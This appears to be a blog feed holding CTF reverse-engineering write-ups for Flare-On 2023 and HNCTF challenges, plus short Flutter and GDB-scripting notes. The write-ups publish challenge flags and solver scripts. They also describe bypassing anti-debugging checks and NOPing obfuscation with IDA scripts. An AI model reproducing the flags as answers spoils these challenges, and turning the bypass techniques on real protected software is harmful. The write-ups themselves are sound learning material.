<h3 id="x"><a class="markdownIt-Anchor" href="#x">#</a> X</h3>
<p>dotpeek 打开直接秒： <code>glorified_captcha@flare-on.com</code>  （这 flag 格式和平时都不一样…）</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004185236537.png" alt="image-20231004185236537"></p>
<h3 id="itsonfire"><a class="markdownIt-Anchor" href="#itsonfire">#</a> ItsOnFire</h3>
<p>最好是新版 jeb 打开，会自动解析 res 资源，这里的字符串基本上都是从 res 里面提的，自己翻会很痛苦</p>
<p>和一般的题确实差别不小，这里的 flag 逻辑和游戏本身关系并不大，翻翻可以找到这个 <code>MessageWorker</code>  有可疑的地方</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004185529273.png" alt="image-20231004185529273"></p>
<p>一步步翻：</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004185613934.png" alt="image-20231004185613934"></p>
<p>这里的类名混淆其实很有效，不仔细就容易看漏 555</p>
<p>往下翻</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004185723229.png" alt="image-20231004185723229"></p>
<p>找到 AES 逻辑，对图片进行解密</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004185746882.png" alt="image-20231004185746882"></p>
<p>秘钥生成的逻辑：</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004185818436.png" alt="image-20231004185818436"></p>
<p>iv 上面有了</p>
<p><a href="http://exp.py">exp.py</a>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_key</span>(<span class="params">base_string</span>):</span><br><span class="line">    crc_val = binascii.crc32(base_string.encode())</span><br><span class="line">    key = (<span class="built_in">str</span>(crc_val) * <span class="number">2</span>)[:<span class="number">16</span>]</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;https://flare-on.com/evilc2server/report_token/report_token.php?token=&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;wednesday&#x27;</span></span><br><span class="line">key_ori = a[<span class="number">4</span>:<span class="number">10</span>] + b[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_aes_cbc</span>(<span class="params">input_filename, output_filename</span>):</span><br><span class="line">    key = compute_key(<span class="string">&quot;s://fldne&quot;</span>)</span><br><span class="line">    iv = <span class="string">&quot;abcdefghijklmnop&quot;</span>.encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        encrypted_hex_data = file.read().<span class="built_in">hex</span>()</span><br><span class="line">    encrypted_data = <span class="built_in">bytes</span>.fromhex(encrypted_hex_data)</span><br><span class="line">    cipher = AES.new(key.encode(), AES.MODE_CBC, iv)</span><br><span class="line">    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_filename = <span class="string">&quot;iv.png&quot;</span></span><br><span class="line">    output_filename = <span class="string">&quot;outputiv.png&quot;</span></span><br><span class="line">    decrypt_aes_cbc(input_filename, output_filename)</span><br><span class="line"></span><br><span class="line"><span class="comment"># YOUr3_ON_F1r3_K33P_6O1N6@flare-on.com</span></span><br></pre></td></tr></table></figure>
<p><img loading="lazy" data-src="flare-on2023/outputiv.png" alt="outputiv"></p>
<h3 id="mypassion"><a class="markdownIt-Anchor" href="#mypassion">#</a> mypassion</h3>
<h6 id="上强度了-104基本上做了一半慢慢看"><a class="markdownIt-Anchor" href="#上强度了-104基本上做了一半慢慢看">#</a> 上强度了… 10.4: 基本上做了一半… 慢慢看…</h6>
<p>相当长的 check 逻辑，前面的并不是 flag，也就是前面的部分需要保证成功运行过了即可（虽然听着简单，实际上很不简单）</p>
<p><code>main函数</code> 框定了大体的框架，可以看出来输入方式以及部分输入位（这里的 check 就不是很严格，某种意义上在按暗示你前面不是 flag 了，不过确实没啥经验，前面还做了挺久）</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004190415608.png" alt="image-20231004190415608"></p>
<p>这里有一位 shellcode 汇编的爆破，可以用 capstone 枚举猜一下，还算比较容易</p>
<p>然后注册了一张表，后续都会从这张表里面调用函数</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004195639784.png" alt="image-20231004195639784"></p>
<p>下来这一层，给出了 input 的整体框架： <code>***/***/***/***/***/</code>  类似这样，每层会用 <code>/</code>  切割检查其中的内容</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004190838143.png" alt="image-20231004190838143"></p>
<p>然后很多 trick，直接放我目前的结论（估计不完全准确，但是能过就行）</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004191225471.png" alt="image-20231004191225471"></p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004191235080.png" alt="image-20231004191235080"></p>
<p>里面有个 tick 的函数会计时，如果运行程序太快也会触发退出…（它的 check 不仅有 exitProcess, 还有前面的重启电脑、sleep、tick 等等，也是需要注意看）</p>
<p>继续往下，到第二个斜杠了，目前就到这样： <code>0;;**R@brUc3E/1337aaa/0/*pizza</code>  中间那个数会复制，放到后面文件名里的文件去，再往后是四进制 = 长度，0 或 1a 均可，然后 pizza 是固定的，第 0 位随机即可</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004191911752.png" alt="image-20231004191911752"></p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004191929255.png" alt="image-20231004191929255"></p>
<p>然后来了个难点，这里需要往里面填 shellcode，这里是不能硬过的，会影响下文，必须把所有 shellcode 缺失位全部填上…</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004192218833.png" alt="image-20231004192218833"></p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004192306788.png" alt="image-20231004192306788"></p>
<p>可以观察我们需要填出来的函数：（高手学长师傅看出来这里是 <code>InMemoryOrderModuleList</code> ，v4 大概是个这个函数 <code>GetExportedFunctionAddress64</code> ）</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004192329092.png" alt="image-20231004192329092"></p>
<p>进到 v4，第一个汇编就是 0x65，即组成： <code>mov     rax, gs:60h</code></p>
<h6 id="这一段晚点补有点复杂的"><a class="markdownIt-Anchor" href="#这一段晚点补有点复杂的">#</a> 这一段晚点补，有点复杂的</h6>
<p>下一段</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004214714348.png" alt="image-20231004214714348"></p>
<p>目前的 input：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0;;**R@brUc3E/1337pr.ost/0/*pizza/AMu$E`0R.?AZe/YPXEKCZXYIGMNOXNMXPYCXGXN/ob5cUr3/111</span><br></pre></td></tr></table></figure>
<p><img loading="lazy" data-src="flare-on2023/image-20231004221540631.png" alt="image-20231004221540631"></p>
<p>后面小 nop 一下，就有了（虽然不知道为什么最后没 com)</p>
<p><img loading="lazy" data-src="flare-on2023/image-20231004230518770.png" alt="image-20231004230518770"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b0rn_t0_5truc7_b4by@flare-on.com</span><br></pre></td></tr></table></figure>
<h6 id="总结的话就是第五个part那里的shellcode最难啥时候来补一下wp鸽"><a class="markdownIt-Anchor" href="#总结的话就是第五个part那里的shellcode最难啥时候来补一下wp鸽">#</a> 总结的话，就是第五个 part，那里的 shellcode 最难（啥时候来补一下 wp，鸽）</h6>
]]></content>
  </entry>
  <entry>
    <title>flutter开发初探</title>
    <url>/2024/03/28/flutter%E5%BC%80%E5%8F%91%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface本意是练练手开发二进制实在看累了顺便积累一点安卓"><a class="markdownIt-Anchor" href="#preface本意是练练手开发二进制实在看累了顺便积累一点安卓">#</a> PREFACE：本意是练练手开发（<s>二进制实在看累了，顺便积累一点安卓</s>）</h6>
<span id="more"></span>
<p>项目地址：<a href="https://github.com/DeMoYao100/woyao_app">DeMoYao100/woyao_app (github.com)</a> 不定期更新（希望）</p>
<p>环境配置：<a href="https://flutter.cn/docs">Flutter 开发文档 | Flutter 中文文档 - Flutter 中文开发者网站 - Flutter</a>，推荐 vscode（出现过热重载问题，有实在看不出来的 bug 建议 clean 一下）</p>
<p>环境搭建 SDK issue：<a href="https://stackoverflow.com/questions/76882205/error-linkageerror-occurred-while-loading-main-class-com-android-sdklib-tool-sd">https://stackoverflow.com/questions/76882205/error-linkageerror-occurred-while-loading-main-class-com-android-sdklib-tool-sd</a></p>
<p>一些遇到的问题写在注释里了，代码不长，目前就两千行，没咋写注释…</p>
<p>配置签名和安卓一样，加 icon 注意一下版本问题</p>
<blockquote>
<p>flutter clean</p>
<p>flutter pub get</p>
<p>dart run flutter_launcher_icons:main</p>
<p>flutter build apk --release</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>gdb_python初探</title>
    <url>/2023/11/09/gdb-python%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface感觉有时候用得到其实是看到了别人的脚本不会用"><a class="markdownIt-Anchor" href="#preface感觉有时候用得到其实是看到了别人的脚本不会用">#</a> PREFACE：感觉有时候用得到（<s>其实是看到了别人的脚本不会用</s>）</h6>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://www.hex-rays.com/products/ida/support/idadoc/1343.shtml</span><br><span class="line">gdbserver --multi *:1234</span><br></pre></td></tr></table></figure>
<p>然后可以在 gdb 里面使用 gdb 脚本</p>
<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) source path/to/your/script.py</span><br></pre></td></tr></table></figure>
<p>几个 api 使用：</p>
<ul>
<li>使用 gdb 内部的指令：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gdb.execute(<span class="string">&#x27;指令&#x27;</span>)</span><br><span class="line"><span class="comment"># eg.</span></span><br><span class="line">gdb.execute(<span class="string">&#x27;c&#x27;</span>)  </span><br><span class="line">gdb.execute(<span class="string">&#x27;b *0x55555559C078&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>获取寄存器：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = gdb.selected_frame()</span><br><span class="line">rip = frame.read_register(<span class="string">&quot;rip&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>其实感觉只需要 <code>gdb.execute</code> ，配合 gdb 原生的指令，就可以愉快开始 hook 了，甚至可以轻松把调试过程都记录下来，确实好东西</p>
<p>比如这样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    frame = gdb.selected_frame()</span><br><span class="line">    rip = frame.read_register(<span class="string">&quot;rip&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> rip == <span class="number">0x55555559C078</span> :  <span class="comment"># 这里是断点</span></span><br><span class="line">        rdx = frame.read_register(<span class="string">&quot;rdx&quot;</span>)</span><br><span class="line">    gdb.execute(<span class="string">&#x27;c&#x27;</span>)</span><br></pre></td></tr></table></figure>
<hr>
<p>一些其他的 tips：</p>
<p>从 AT&amp;T 语法切换到 intel 语法：</p>
<blockquote>
<p>echo ‘set disassembly-flavor intel’ &gt;&gt; ~/.gdbinit</p>
</blockquote>
<p>使用 gdb 自带的指令</p>
<blockquote>
<p>gdb -x script.gdb ./file</p>
<blockquote>
<p>script.gdb</p>
<p>条件断点，eg. 在断点处打印 $rax 或执行一些需要的操作；类似 idapython <code>print(get_reg_value('rax'))</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b *main</span><br><span class="line">commands</span><br><span class="line">  silent</span><br><span class="line">  p $rax</span><br><span class="line">  continue</span><br><span class="line">end</span><br><span class="line">r</span><br><span class="line">q</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<p>补：这里有一个 issue，dbg 或者 gef 用的时候会调用一个有 bug 的 gdb api，有需要 <code>continue</code>  的时候用 <code>pi gdb.execute(&quot;continue&quot;)</code></p>
]]></content>
  </entry>
  <entry>
    <title>hnctfRe</title>
    <url>/2022/11/02/hnctfRe/</url>
    <content><![CDATA[<h6 id="some-reverse-questions-i-didnt-have-time-to-solve-or-didnt-solve-out"><a class="markdownIt-Anchor" href="#some-reverse-questions-i-didnt-have-time-to-solve-or-didnt-solve-out">#</a> Some reverse questions I didn’t have time to solve. (Or didn’t solve out…)</h6>
<span id="more"></span>
<h3 id="help_me"><a class="markdownIt-Anchor" href="#help_me">#</a> Help_Me!</h3>
<h5 id="my-exp"><a class="markdownIt-Anchor" href="#my-exp">#</a> My exp:</h5>
<pre><code>#include&lt;bits/stdc++.h&gt;
using namespace std;
int v12[1000]=&#123;0&#125;;
int v13[1000]=&#123;0&#125;;
long long maxn;
int v[1000];
void dfs(int cns,int n,int num,long long sum)&#123;
    if (num&gt;200 || n==20)
    &#123;
        if (n!=20)
        sum-=v12[n];
        cns--;
        if (sum&gt;=maxn)&#123;
            maxn=sum;
            cout&lt;&lt;&quot;sum  =  &quot;&lt;&lt;sum&lt;&lt;&quot;    :  &quot;&lt;&lt;&quot;cns=&quot;&lt;&lt;cns&lt;&lt;&quot;   &quot;;
            for (int i=0;i&lt;cns;i++)&#123;
                cout&lt;&lt;v[i]&lt;&lt;&quot; &quot;;
            &#125;
            cout&lt;&lt;endl;
        &#125;
        return ;
    &#125;
    
    for (int i=n+1;i&lt;=20;i++)&#123;
        v[cns]=i;
        
        dfs(cns+1,i,num+v13[i],sum+v12[i]);
    &#125;
&#125;


int main()&#123;
    
    v12[0] = 26;
    v12[1] = 59;
    v12[2] = 30;
    v12[3] = 19;
    v12[4] = 66;
    v12[5] = 85;
    v12[6] = 94;
    v12[7] = 8;
    v12[8] = 3;
    v12[9] = 44;
    v12[20] = 1000;
    v12[10] = 5;
    v12[11] = 1;
    v12[12] = 41;
    v12[13] = 82;
    v12[14] = 76;
    v12[15] = 1;
    v12[16] = 12;
    v12[17] = 81;
    v12[18] = 73;
    v12[19] = 32;
    v12[20]=1;
    v13[0] = 71;
    v13[1] = 34;
    v13[20] = 1000;
    v13[2] = 82;
    v13[3] = 23;
    v13[4] = 1;
    v13[5] = 88;
    v13[6] = 12;
    v13[7] = 57;
    v13[8] = 10;
    v13[9] = 68;
    v13[10] = 5;
    v13[11] = 33;
    v13[12] = 37;
    v13[13] = 69;
    v13[14] = 98;
    v13[15] = 24;
    v13[16] = 26;
    v13[17] = 83;
    v13[18] = 16;
    v13[19] = 26;
    v13[20]=1;
    maxn=0;
    dfs(0,-1,0,1);
&#125;
</code></pre>
<h5 id="official-exp"><a class="markdownIt-Anchor" href="#official-exp">#</a> Official exp:</h5>
<pre><code>#include &quot;iostream&quot;
#include &quot;stdio.h&quot;
using namespace std;
int val[50]=&#123;26, 59, 30, 19, 66, 85, 94, 8, 3, 44, 5, 1, 41, 82, 76, 1,    12,    81,    73,    32&#125;,
w[50]=&#123;71, 34, 82, 23, 1,88,12,57, 10, 68, 5, 33,    37,    69,    98,    24, 26,    83, 16, 26&#125;;
int dp[21][301];
int main()
&#123;
    int t=200;
    int m = 20;
    for(int i=1;i&lt;=m;i++) 
        for(int j=t;j&gt;=0;j--)  
    &#123;
        if(j&gt;=w[i])//容量可以放 
        &#123;
            int tmp;
            dp[i][j]=max(dp[i-1][j-w[i]]+val[i],dp[i-1][j]);
        &#125;  
        else
        &#123;
            dp[i][j]=dp[i-1][j];
        &#125;              
    &#125;
    //dp[i][j] = max(dp[i-1][j-w[i]]+val[i],dp[i-1][j]);
    int x = 20;
    int y = 200;
    while(x!=0)
    &#123;
        if(dp[x-1][y-w[x]]+val[x] &gt; dp[x-1][y])        
        &#123;
            printf(&quot;%d,&quot;,x); 
            y-=w[x];
        &#125;
        x-=1;
    &#125;
    return 0;
&#125;
</code></pre>
<p>A 0-1 bag problem. And notice that you should <c style="color: #FF0000;">ADD</c> v12, not MULTIPLY, like in the ida…</p>
<h3 id="cm2"><a class="markdownIt-Anchor" href="#cm2">#</a> CM2</h3>
<h6 id="dont-understand-how-to-debug-to-find-the-place-though-by-guessing-i-work-it-out-anyway"><a class="markdownIt-Anchor" href="#dont-understand-how-to-debug-to-find-the-place-though-by-guessing-i-work-it-out-anyway">#</a> Don’t understand how to debug to find the place… Though by guessing I work it out anyway.</h6>
<h5 id="officail-wp"><a class="markdownIt-Anchor" href="#officail-wp">#</a> Officail wp:</h5>
<p><img loading="lazy" data-src="hnctfRe/cm2.png" alt="cm2"></p>
<h3 id="try2debugplusplus"><a class="markdownIt-Anchor" href="#try2debugplusplus">#</a> Try2debugPlusPlus</h3>
<p>Nop the  <code>IsDebuggerPresent()</code> (noticed that there are two of them) and get the key(remember to set breakpoint after  <code>printf()</code> ):</p>
<p><img loading="lazy" data-src="hnctfRe/debug2_1.png" alt="debug2_1"></p>
<p>Though is easy for us to decrypt the tea_encrypt, question setter seems to have forgotten something…</p>
<p><img loading="lazy" data-src="hnctfRe/debug2_2.png" alt="debug2_2"></p>
<h3 id="what_1in_d11"><a class="markdownIt-Anchor" href="#what_1in_d11">#</a> What_1in_D11</h3>
<p>Repair the upx’s features(easy in this problem, to study more you can refer to <a href="https://www.52pojie.cn/thread-326995-1-1.html">this blog</a>)</p>
<p>And  <code>upx -d</code>  to unpacked the .dll, check it in ida, we got:</p>
<p><img loading="lazy" data-src="hnctfRe/dll_1.png" alt="dll"></p>
<h5 id="official-writeup"><a class="markdownIt-Anchor" href="#official-writeup">#</a> Official writeup:</h5>
<h6 id="a-btea-encrypt-which-i-am-not-fimilar-with-yet-shall-get-more-study-about-encryption-and-decryption-later"><a class="markdownIt-Anchor" href="#a-btea-encrypt-which-i-am-not-fimilar-with-yet-shall-get-more-study-about-encryption-and-decryption-later">#</a> (A btea encrypt, which I am not fimilar with yet. Shall get more study about encryption and decryption later.)</h6>
<pre><code>#include &lt;stdio.h&gt;  
#include &lt;stdint.h&gt;  
#define DELTA 0x9e3779b9  
#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  
void btea(uint32_t *v, int n, uint32_t const key[4])  
&#123;  
    uint32_t y, z, sum;  
    unsigned p, rounds, e;  
    if (n &gt; 1)            /* Coding Part */  
    &#123;  
        rounds = 6 + 52/n;  
        sum = 0;  
        z = v[n-1];  
        do  
        &#123;  
            sum += DELTA;  
            e = (sum &gt;&gt; 2) &amp; 3;  
            for (p=0; p&lt;n-1; p++)  
            &#123;  
                y = v[p+1];  
                z = v[p] += MX;  
            &#125;  
            y = v[0];  
            z = v[n-1] += MX;  
        &#125;  
        while (--rounds);  
    &#125;  
    else if (n &lt; -1)      /* Decoding Part */  
    &#123;  
        n = -n;  
        rounds = 6 + 52/n;  
        sum = rounds*DELTA;  
        y = v[0];  
        do  
        &#123;  
            e = (sum &gt;&gt; 2) &amp; 3;  
            for (p=n-1; p&gt;0; p--)  
            &#123;  
                z = v[p-1];  
                y = v[p] -= MX;  
            &#125;  
            z = v[n-1];  
            y = v[0] -= MX;  
            sum -= DELTA;  
        &#125;  
        while (--rounds);  
    &#125;  
&#125;  
int main()  
&#123;  
    unsigned int enc[8]=&#123;0x22a577c1,0x1c12c03,0xc74c3ebd,0xa9d03c85,0xadb8ffb3&#125;;
    uint32_t const k[4]= &#123;55,66,77,88&#125;;  
    int n= 5; //n的绝对值表示v的长度，取正表示加密，取负表示解密  
    // v为要加密的数据是两个32位无符号整数  
    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  
    btea(enc, -n, k);  
    for(int i=0;i&lt;5;i++)
    &#123;
            printf(&quot;%x&quot;,enc[i]);
        &#125;
    return 0;  
&#125;  
</code></pre>
<h3 id="mazes"><a class="markdownIt-Anchor" href="#mazes">#</a> Mazes</h3>
<h6 id="a-bit-complex-wait-until-later"><a class="markdownIt-Anchor" href="#a-bit-complex-wait-until-later">#</a> A bit complex, wait until later…</h6>
<h3 id="stub"><a class="markdownIt-Anchor" href="#stub">#</a> stub</h3>
<h6 id="never-seen-before-later"><a class="markdownIt-Anchor" href="#never-seen-before-later">#</a> Never seen before, later…</h6>
<h3 id="ez_maze"><a class="markdownIt-Anchor" href="#ez_maze">#</a> ez_maze</h3>
<p>We get a .exe file, from its’ icon we know that we should uncompile it to .pyc with  <code>pyinstxtractor</code></p>
<p><img loading="lazy" data-src="hnctfRe/ez_maze_1.png" alt="ez_maze"></p>
<p>Then, we got a package  <code>_extracted</code> :</p>
<h6 id="complex-it-is"><a class="markdownIt-Anchor" href="#complex-it-is">#</a> complex it is…</h6>
<p><img loading="lazy" data-src="hnctfRe/extracted.png" alt="extracted"></p>
<p>Find a file named  <code>maze</code>  (without a suffix one!) Change its suffix into  <code>.pyc</code>  and Try  <code>compyle6 -o maze.py maze.pyc</code> , it went wrong:</p>
<p><img loading="lazy" data-src="hnctfRe/uncompyle6.png" alt="compyle6"></p>
<p>That’s when you find out that pyinstxtractor didn’t fix your .pyc file’s magic number.</p>
<p><img loading="lazy" data-src="hnctfRe/cmakeInstall.png" alt="cmake"></p>
<p><a href="https://www.jb51.net/article/231188.htm">The link problem setter gives you</a>, which does no help at all…The  <code>magic number</code>  of the file  <code>struct</code>  is destroy as well…</p>
<p><img loading="lazy" data-src="hnctfRe/magicNumber_1.jpg" alt="magicNumber_1"></p>
<p>I been trying tools like  <code>uncompyle6</code> (which does not support python 3.10, and install python 3.9 does not help at all. Later I should look into this problem and try to solved it…)  and  <code>pycdc</code> (which is said to support high edition, but can not identify the magic number as well) However, when I tried to add some magic number from other python edition(Python 3.8b2, if I remember it right), and put it in an <a href="https://tool.lu/pyc/">online uncompiler</a>. It just worked…</p>
<blockquote>
<p><a href="https://www.cnblogs.com/Here-is-SG/p/15885799.html">a blog from my classmate that may help(though I do not really think so…)</a></p>
</blockquote>
<h5 id="some-magic-number"><a class="markdownIt-Anchor" href="#some-magic-number">#</a> some magic number:</h5>
<pre><code>enum PycMagic &#123;
    MAGIC_1_0 = 0x00999902,
    MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */
    MAGIC_1_3 = 0x0A0D2E89,
    MAGIC_1_4 = 0x0A0D1704,
    MAGIC_1_5 = 0x0A0D4E99,
    MAGIC_1_6 = 0x0A0DC4FC,

    MAGIC_2_0 = 0x0A0DC687,
    MAGIC_2_1 = 0x0A0DEB2A,
    MAGIC_2_2 = 0x0A0DED2D,
    MAGIC_2_3 = 0x0A0DF23B,
    MAGIC_2_4 = 0x0A0DF26D,
    MAGIC_2_5 = 0x0A0DF2B3,
    MAGIC_2_6 = 0x0A0DF2D1,
    MAGIC_2_7 = 0x0A0DF303,

    MAGIC_3_0 = 0x0A0D0C3A,
    MAGIC_3_1 = 0x0A0D0C4E,
    MAGIC_3_2 = 0x0A0D0C6C,
    MAGIC_3_3 = 0x0A0D0C9E,
    MAGIC_3_4 = 0x0A0D0CEE,
    MAGIC_3_5 = 0x0A0D0D16,
    MAGIC_3_5_3 = 0x0A0D0D17,
    MAGIC_3_6 = 0x0A0D0D33,
    MAGIC_3_7 = 0x0A0D0D42,
    MAGIC_3_8 = 0x0A0D0D55,
    MAGIC_3_9 = 0x0A0D0D61,
&#125;;
</code></pre>
<p>uncompyle:(to long the maze is, I didn’t put it here)</p>
<p><img loading="lazy" data-src="hnctfRe/uncompyle.jpg" alt="uncompyle"></p>
<p>Dfs script(From official wp):</p>
<pre><code>map1=[...]
map2 =  [[0 for i in range(len(map1))] for i in range(len(map1)) ]
flag=&quot;&quot;
def DFS(x,y):
    global flag
    if x == len(map1) - 2 and y == len(map1) - 2: #判断边界
        print(flag)
    if map1[x+1][y] == 0 and map2[x+1][y] == 0:
        map2[x][y] = 1
        flag += 's'
        DFS(x+1,y)
        flag = flag[:-1]
        map2[x][y] = 0
    if map1[x-1][y] == 0 and map2[x-1][y] == 0:
        map2[x][y] = 1
        flag += 'w'
        DFS(x-1,y)
        flag = flag[:-1]
        map2[x][y] = 0
    if map1[x][y+1] == 0 and map2[x][y+1] == 0:
        map2[x][y] = 1
        flag += 'd'
        DFS(x,y+1)
        flag = flag[:-1]
        map2[x][y] = 0
    if map1[x][y-1] == 0 and map2[x][y-1] == 0:
        map2[x][y] = 1
        flag += 'a'
        DFS(x,y-1)
        flag = flag[:-1]
        map2[x][y] = 0
y=1
x=1
DFS(x,y)
</code></pre>
<h3 id="findit"><a class="markdownIt-Anchor" href="#findit">#</a> findit</h3>
<p>Gets a .exe file, check whether shell exists.</p>
<p><img loading="lazy" data-src="hnctfRe/findItShell.png" alt="shell"></p>
<h5 id="open-it-with-ida"><a class="markdownIt-Anchor" href="#open-it-with-ida">#</a> Open it with ida.</h5>
<p><img loading="lazy" data-src="hnctfRe/finditIda_1.png" alt="ida1"><br>
<img loading="lazy" data-src="hnctfRe/finditIda_2.png" alt="ida2"><br>
<img loading="lazy" data-src="hnctfRe/finditIda_3.png" alt="ida3"></p>
<p>A complex encryption. The key and the flag both needs to be brute forces out. I shall do a emersion later…</p>
<h5 id="official-wp"><a class="markdownIt-Anchor" href="#official-wp">#</a> Official wp:</h5>
<pre><code>mid=[32,59,121,60,125,45,32,17,38,0,43,45,48,48,28,42,11,20,49,100,63,119,103,53,173,46,136,158,49,78,78,176]
enc=[29,70,92,84,87,19,61,43,62,60,29,9,18,63,6,6,42,14,124,110,109,60,105,191,7,162,64,104,92,61,223,179]
flag=[0]*32
flag[31]=179
flag[30]=223
print(flag)
#th1s_3ncryt_is_s0_e@sy!1
key = [ord(i) for i in &quot;HN_CTF&quot;]
def decrypt(arr):
    for i in range(0,len(arr)//4):
        tmp = arr[4*i:4*i+4]
        st = &quot;&quot;
        st+=chr(tmp[3]^key[i%6])
        st+=chr(tmp[0]^key[i%6])
        st+=chr(tmp[2]^key[i%6])
        st+=chr(tmp[1]^key[i%6])
        print(st,end='')
    print()   
    pass
def dfs(deep):
    global flag
    if(deep==0):
        decrypt(flag)
    else:
        for i in range(0,0xff):
            if( enc[deep-1] == (0x12+deep-1)^ ((i+12)%24 )^ i ^ flag[deep]):
                flag[deep-1] = i
                dfs(deep-1)
dfs(31)
</code></pre>
<h3 id="flower"><a class="markdownIt-Anchor" href="#flower">#</a> flower</h3>
<p>From ida, there are a lot of junkcodes inside, and we have to patch them before I can analyze the code.</p>
<p><a href="https://www.52pojie.cn/thread-1512089-1-1.html">junkcode</a></p>
<h5 id="some-script-to-nop-the-junkcodes"><a class="markdownIt-Anchor" href="#some-script-to-nop-the-junkcodes">#</a> Some script to nop the junkcodes:</h5>
<p><img loading="lazy" data-src="hnctfRe/flower_junkcode_1.png" alt="junkcode1"></p>
<h5 id="scripts1"><a class="markdownIt-Anchor" href="#scripts1">#</a> scripts1:</h5>
<pre><code>import idc
import idautils
start =0x00401000
end = 0x00401401
bad=[0x75,0x02,0x74,0x01,0xc7]

for i in range(start,end):
    if idc.get_wide_byte(i) == 0x75:
        flag=1
        for j in range(len(bad)):
            if(idc.get_wide_byte(i+j)!= bad[j]):
                flag=0
                break
        if flag==1:
            for j in range(len(bad)):
                patch_byte(i+j,0x90)
                print(&quot;success&quot;)
</code></pre>
<h5 id="scripts2"><a class="markdownIt-Anchor" href="#scripts2">#</a> scripts2:</h5>
<p><img loading="lazy" data-src="hnctfRe/flower_junkcode_2.png" alt="junkcode2"></p>
<pre><code>import idc
import idautils
start =0x00401000
end = 0x00401401
bad=[0xe8,0x01,0x00,0x00,0x00,0xe8,0x36,0x83,0x04,0x24,0x08,0xc3,0xe8]

for i in range(start,end):
    if idc.get_wide_byte(i) == 0xe8:
        flag=1
        for j in range(len(bad)):
            if(idc.get_wide_byte(i+j)!= bad[j]):
                flag=0
                break
        if flag==1:
            for j in range(len(bad)):
                patch_byte(i+j,0x90)
                print(&quot;success&quot;)
</code></pre>
<h6 id="some-interlude"><a class="markdownIt-Anchor" href="#some-interlude">#</a> Some interlude:</h6>
<p><img loading="lazy" data-src="hnctfRe/flowerPDF.png" alt="PDF"></p>
<h5 id="anyway-the-uncompilation-shall-look-like-this"><a class="markdownIt-Anchor" href="#anyway-the-uncompilation-shall-look-like-this">#</a> Anyway, the uncompilation shall look like this:</h5>
<p><img loading="lazy" data-src="hnctfRe/flowerIda.png" alt="ida"></p>
<h5 id="the-encrypt-function"><a class="markdownIt-Anchor" href="#the-encrypt-function">#</a> The encrypt function:</h5>
<p><img loading="lazy" data-src="hnctfRe/flowerEncrypt.png" alt="encrypt"></p>
<h5 id="now-we-get-the-encryption-we-can-know-that-it-is-a-rc4-encryption-and-here-comes-the-official-exp"><a class="markdownIt-Anchor" href="#now-we-get-the-encryption-we-can-know-that-it-is-a-rc4-encryption-and-here-comes-the-official-exp">#</a> Now we get the encryption, we can know that it is a RC4- encryption, and here comes the official exp:</h5>
<pre><code>#include &lt;iostream&gt;
using namespace std;
unsigned int ar[40] = &#123; 0x4d,0xffffffe6,0x49,0xffffff95,0x3,0x2d,0x2b,0xffffffba,0xffffffea,0x6d,0xffffffff,0x59,0x70,0x0,0x1b,0xffffffa9,0x2c,0xffffffb0,0x32,0xffffff98,0x6f,0xffffff8c,0x56,0xffffffa2,0x4c,0x79,0x7f &#125;;
